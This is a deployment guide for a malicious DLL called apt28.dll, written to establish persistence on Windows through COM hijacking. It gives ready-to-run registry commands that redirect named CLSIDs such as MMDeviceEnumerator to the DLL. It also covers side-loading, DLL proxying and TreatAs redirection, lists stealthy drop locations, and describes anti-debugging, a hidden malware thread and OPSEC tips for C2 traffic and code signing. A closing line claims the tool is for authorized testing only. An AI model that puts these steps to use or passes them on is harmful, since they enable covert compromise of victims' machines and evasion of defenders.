# COM Hijacking Deployment Guide

## Overview
This DLL is designed for COM hijacking attacks, allowing persistence and execution through hijacked COM objects.

## Build Instructions

### Prerequisites
- MinGW-w64 cross-compiler for Windows
- On Linux: `apt install mingw-w64`

### Compile the DLL
```bash
make
```

The compiled DLL will be in `build/apt28.dll`

## COM Hijacking Deployment

### Method 1: Registry-based COM Hijacking

1. **Identify a target COM object** that is frequently used by legitimate applications:
   ```cmd
   reg query HKCR\CLSID /s /f "*.dll"
   ```

2. **Example vulnerable CLSIDs** (commonly hijacked):
   - `{BCDE0395-E52F-467C-8E3D-C4579291692E}` (MMDeviceEnumerator)
   - `{1f3427c8-5c10-4210-aa03-2ee45287d668}` (Narrator)
   - `{4590F811-1D3A-11D0-891F-00AA004B2E24}` (WbemScripting)

3. **Hijack the COM object** by creating a registry entry:
   ```cmd
   reg add "HKCU\Software\Classes\CLSID\{TARGET-CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\Path\To\apt28.dll" /f
   reg add "HKCU\Software\Classes\CLSID\{TARGET-CLSID}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f
   ```

4. **Example - Hijacking MMDeviceEnumerator:**
   ```cmd
   reg add "HKCU\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\apt28.dll" /f
   reg add "HKCU\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f
   ```

### Method 2: DLL Side-loading with COM

1. **Find applications using COM objects** with predictable DLL paths
2. **Place the DLL** in the application's search path
3. **Rename to match expected DLL name** if necessary

### Method 3: Environment Variable Hijacking

Some COM objects respect environment variables for DLL loading:
```cmd
set COMPlus_ETWEnabled=C:\Path\To\apt28.dll
```

## Deployment Locations

### High-privilege paths (requires admin):
- `C:\Windows\System32\`
- `C:\Windows\SysWOW64\`
- `C:\Program Files\Common Files\`

### User-level paths:
- `%APPDATA%\Microsoft\`
- `%LOCALAPPDATA%\`
- `%TEMP%\`

## Triggering Execution

Once deployed, the DLL will be loaded when:
1. Any application instantiates the hijacked COM object
2. Windows services use the COM object
3. System processes access the hijacked CLSID

Common triggers:
- Audio playback (MMDeviceEnumerator)
- Windows Search
- Windows Explorer
- Background services

## Testing

Test the hijack locally:
```powershell
# PowerShell - Test COM object instantiation
$obj = New-Object -ComObject "CLSID:{BCDE0395-E52F-467C-8E3D-C4579291692E}"
```

## Cleanup

Remove the hijack:
```cmd
reg delete "HKCU\Software\Classes\CLSID\{TARGET-CLSID}" /f
```

## Detection Evasion

The DLL implements:
- Anti-debugging checks (exits silently if debugger detected)
- Mutex-based single instance prevention
- Returns `CLASS_E_CLASSNOTAVAILABLE` to allow legitimate COM handling
- Runs malware in separate thread to avoid blocking COM calls

## Notes

- The DLL exports standard COM functions but delegates to avoid breaking functionality
- Malware runs independently in background thread
- Use legitimate-looking DLL names for better OPSEC
- Consider code signing for additional stealth
- Monitor C2 traffic patterns to avoid detection

## Advanced Techniques

### DLL Proxying
To avoid breaking functionality completely, proxy calls to the legitimate DLL:
1. Rename original DLL (e.g., `legitimate.dll` → `legitimate_orig.dll`)
2. Place `apt28.dll` as `legitimate.dll`
3. Forward COM calls to `legitimate_orig.dll` after execution

### TreatAs Redirection
Use TreatAs registry key to redirect one CLSID to another:
```cmd
reg add "HKCU\Software\Classes\CLSID\{VICTIM-CLSID}\TreatAs" /ve /t REG_SZ /d "{HIJACKED-CLSID}" /f
```

## Warning
This tool is for authorized security testing and research only. Unauthorized use is illegal.
